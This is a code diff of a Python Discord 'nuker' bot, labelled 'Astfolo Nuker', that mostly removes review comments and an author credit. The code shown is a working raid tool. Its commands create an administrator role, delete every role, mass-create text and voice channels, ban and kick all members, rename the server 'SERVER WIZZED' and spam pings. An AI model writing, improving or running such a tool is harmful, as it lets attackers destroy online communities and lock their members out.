@@ -1,15 +1,13 @@
-'''
-Femboyed by oAaron#0001
-'''
-from discord import Permissions #I like how you imported but never used
+from discord import Permissions 
 import discord,random,time
 import json
-from discord.ext import commands #Didn't need tasks
+from discord.ext import commands 
 import os 
 import colorama
 import asyncio
 from colorama import Fore
-from discord import Embed #Also didn't use this, you just ended up doing discord.Embed
+from discord import Embed 
+
 colorama.init()
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=">",intents=intents)
@@ -52,7 +50,7 @@ async def d(ctx,channel_id="all"):
 
 @bot.command(pass_context=True)
 async def admin(ctx):
-    await ctx.message.delete() # put this here since in the event it won't give you admin, the original message will not delete
+    await ctx.message.delete() 
     try:
         guild = ctx.guild
         role = await guild.create_role(name="Astfolo Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
@@ -78,7 +76,6 @@ async def transrspam(ctx):
    print("Spamming roles <3")
 @bot.command()
 async def rdelete(ctx):
-  #total_roles = "" - why is this a thing?
   for role in ctx.guild.roles:
     try:
       await role.delete()
@@ -91,7 +88,7 @@ async def rdelete(ctx):
 
 @bot.command()
 async def cspam(ctx,amount=10,name_of_channel="nuked"):
-  await ctx.message.delete() #Put this here since yes
+  await ctx.message.delete() 
   for times in range(amount):
     await ctx.guild.create_text_channel(name_of_channel)
   em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
@@ -110,10 +107,7 @@ async def vcspam(ctx,amount=10,name_of_channel="nuked"):
 
 @bot.command()
 async def banAll(ctx):
- #embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff) Somewhat misleading lol
- #await ctx.send(embed=embed)
  await ctx.message.delete()
- #print("Banned All Members <3 ~")
  for user in ctx.guild.members:
         try:
             await user.ban()
@@ -122,8 +116,6 @@ async def banAll(ctx):
            pass
 @bot.command()
 async def kickAll(ctx):
- #embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff) Misleading lol
- #await ctx.send(embed=embed)
  await ctx.message.delete()
  #print("Kicked all members <3 ~")
  for user in ctx.guild.members:
@@ -154,11 +146,9 @@ async def help(ctx):
  embed1.set_image(url="https://media.discordapp.net/attachments/837017058273263712/837752787545882656/1533773770_w_KamaroTheTrap.gif")     
  embed1.set_footer(text="By oAaron")
  await ctx.send(embed=embed1, delete_after=10)
- #time.sleep(10) - this blocks async
- #await embed2.delete() - There is a better way of doing this lol, just do delete_after
- #await ctx.message.delete()
 
-#Pings can be done better ngl
+
+
 @bot.command()
 async def pingspam(ctx):
     await ctx.guild.edit(name="SERVER WIZZED")
@@ -201,8 +191,6 @@ async def servername(ctx, name = None):
     print("Changed Server Name")
     em200 = Embed(color = 0xaf1aff, title=f"Changed the server name to: ***{ctx.guild.name}***")
     await ctx.send(embed=em200, delete_after=8) 
-    #time.sleep(8) - better way of doing this + blocks async. Just do asyncio.sleep instead within async functions
-    #await em2001.delete()
   else:  
     em100 = Embed(color = 0xaf1aff, title=ctx.guild.name)
     em1001 = await ctx.send(embed=em100)
